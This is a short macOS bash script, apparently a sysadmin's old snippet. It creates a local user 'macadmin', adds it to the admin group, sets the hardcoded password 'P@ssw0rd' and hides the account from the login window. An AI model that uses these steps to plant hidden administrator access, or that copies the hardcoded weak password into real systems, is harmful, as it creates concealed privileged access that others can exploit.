#!/bin/bash

# this is old - I have a better script somewhere.

if [ ! -d "/Users/macadmin" ]; then
        /usr/bin/dscl . create /Users/macadmin
        /usr/bin/dscl . create /Users/macadmin PrimaryGroupID 0
        /usr/bin/dscl . create /Users/macadmin UniqueID 444
        /usr/bin/dscl . create /Users/macadmin UserShell /bin/bash
        /usr/bin/dscl . append /Groups/admin GroupMembership macadmin
        /usr/bin/dscl . create /Users/macadmin RealName "Mac Admin"
        /usr/bin/dscl . create /Users/macadmin NFSHomeDirectory /Users/macadmin
        /usr/bin/ditto -rsrc -V "/System/Library/User Template/English.lproj/" /Users/macadmin/
        chown -R macadmin:staff /Users/macadmin/
        /usr/bin/dscl . passwd /Users/macadmin 'P@ssw0rd'
        defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array-add macadmin
        echo "Mac Admin created"
else
        echo "Mac Admin already exixts"
fi

